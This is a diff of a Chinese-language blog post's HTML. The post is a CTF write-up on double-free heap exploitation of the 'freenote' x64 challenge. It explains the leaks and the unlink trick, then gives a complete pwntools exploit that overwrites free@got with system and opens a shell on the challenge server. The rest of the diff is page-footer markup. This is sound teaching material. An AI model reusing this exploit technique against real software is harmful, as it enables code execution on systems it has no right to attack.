+<h3 id="0x03-Double-free漏洞利用实例"><a href="#0x03-Double-free漏洞利用实例" class="headerlink" title="0x03.　Double free漏洞利用实例"></a>0x03.　Double free漏洞利用实例</h3><p>下面以64位的freenote为例，介绍下Double free漏洞的利用。<br>该freenote存在两个漏洞：一个是在建立新note的时候在note的结尾处没有加”\x00”,因此会造成堆栈地址泄露;另一个漏洞就是在delete note时，没有检测这个note是否已经被删除过了，可以删除一个note两遍，造成double free。<br><strong>利用思路：</strong><br>(1) 泄漏libc.so地址，通过新建两个note，然后删除一个note，再新建一个note，泄漏glibc中main_arena.top的地址，然后根据偏移计算其他地址。<br>(2) 泄漏heap地址，让某个非使用中chunk的fd栏位指向另一个 chunk，并且让note的内容拼接上，就可以把chunk在堆上的位置给泄漏出来。<br>(3) 触发unlink机制，并布置参数，导致一次固定地址写。由于申请的堆长度和地址放在bss段，因此可以将fake_fd地址指向 bss第一个堆基址 - 0x18，fake_bk地址指向 bss第一个堆基址 - 0x10，就可以绕过unlink检测机制。<br>(4) 对任意地址读写，覆盖<a href="mailto:&#102;&#x72;&#101;&#x65;&#64;&#x67;&#111;&#x74;&#46;&#112;&#108;&#x74;">&#102;&#x72;&#101;&#x65;&#64;&#x67;&#111;&#x74;&#46;&#112;&#108;&#x74;</a>为system地址。<br><strong>漏洞利用代码：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="comment"># context.log_level =&#x27;debug&#x27;</span></span><br><span class="line">    p = process(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *0x40106a \n b *0x400edc&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># context.log_level =&#x27;debug&#x27;</span></span><br><span class="line">    p = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="number">9886</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_post</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_post</span>(<span class="params">l, c</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;new note: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(l))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line">    p.sendline(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_post</span>(<span class="params">n, l, c</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)    </span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(n))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of note: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(l))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line">    p.sendline(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_post</span>(<span class="params">n</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    free_got = <span class="number">0x602018</span></span><br><span class="line">    <span class="comment"># 1.leak glibc address,then caculate system and &#x27;/bin/sh&#x27; address</span></span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    delete_post(<span class="number">0</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    list_post()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># arena_addr = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    leak_a = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    arena_addr = u64(leak_a[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        system_addr = arena_addr - (<span class="number">0x3c3b68</span> - <span class="number">0x45380</span>) <span class="comment">#local offset</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        system_addr = arena_addr - (<span class="number">0x3be7b8</span> - <span class="number">0x46590</span>) <span class="comment">#remote offset</span></span><br><span class="line">    <span class="comment"># print &#x27;system_adddr %x&#x27; % system_addr    </span></span><br><span class="line">    delete_post(<span class="number">0</span>)</span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.leak heap chunk base</span></span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    delete_post(<span class="number">2</span>)</span><br><span class="line">    delete_post(<span class="number">0</span>)</span><br><span class="line">    edit_post(<span class="number">1</span>, <span class="number">0x98</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x97</span>)</span><br><span class="line">    list_post()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1. AA&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    leak = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    heap_addr = u64(leak[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># print &#x27;heap base %x&#x27; % heap_addr</span></span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line">    delete_post(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.construct fake heap</span></span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    new_post(<span class="number">8</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    fake_pre_size = <span class="number">0xa1</span></span><br><span class="line">    fake_size = <span class="number">0x81</span></span><br><span class="line">    fd = heap_addr - <span class="number">0x17f0</span> - <span class="number">0x18</span></span><br><span class="line">    bk = heap_addr - <span class="number">0x17f0</span> - <span class="number">0x10</span></span><br><span class="line">    payload1 = p64(fake_pre_size) + p64(fake_size) + p64(fd) + p64(bk)</span><br><span class="line">    payload1 += <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = p64(<span class="number">0xa0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;A&#x27;</span> *<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line"></span><br><span class="line">    edit_post(<span class="number">0</span>, <span class="number">0x91</span>, payload1)</span><br><span class="line">    edit_post(<span class="number">2</span>, <span class="number">0x31</span>, payload2)</span><br><span class="line">    delete_post(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. overwrite free@got</span></span><br><span class="line">    payload3 = p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0x8</span>) + p64(free_got)</span><br><span class="line">    payload3 += p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">    payload3 += p64(<span class="number">1</span>)+ p64(<span class="number">0x8</span>) + p64(heap_addr - <span class="number">0x17b8</span>) + <span class="string">&#x27;/bin/sh\n&#x27;</span></span><br><span class="line">    payload3 = payload3.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    edit_post(<span class="number">0</span>, <span class="number">0x91</span>, payload3)</span><br><span class="line">    <span class="comment"># raw_input(&#x27;system(binsh)&#x27;)</span></span><br><span class="line">    edit_post(<span class="number">0</span>, <span class="number">0x8</span>, p64(system_addr))</span><br><span class="line">    delete_post(<span class="number">2</span>)    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04.　参考文献"></a>0x04.　参考文献</h3><p><a target="_blank" rel="noopener" href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916642.220000NaN1.1.JLYyhU&articleid=360">1. Linux堆溢出漏洞利用之unlink</a><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/binary/10638">2. 一步一步学ROP之gadgets和2free篇</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
+
         
 
-        
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/02/17/PWN/Linux%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bfastbin%E5%AE%9E%E4%BE%8B/" rel="prev" title="Linux堆溢出之fastbin实例">
+                  <i class="fa fa-chevron-left"></i> Linux堆溢出之fastbin实例
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/03/01/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8Boff-by-one/" rel="next" title="Linux堆漏洞之off-by-one">
+                  Linux堆漏洞之off-by-one <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
 
 <div class="copyright">
-  
   &copy; 2016 – 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
-    <i class="fa fa-user"></i>
+    <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">D0m021ng</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>
-
-
-    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-        
 <div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
@@ -398,8 +318,7 @@
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
@@ -408,35 +327,15 @@
       </span>
     </span>
 </div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
 
+    </div>
+  </footer>
+
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
 
   
 
@@ -444,19 +343,12 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
   
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
+
+
+
 
 </body>
 </html>
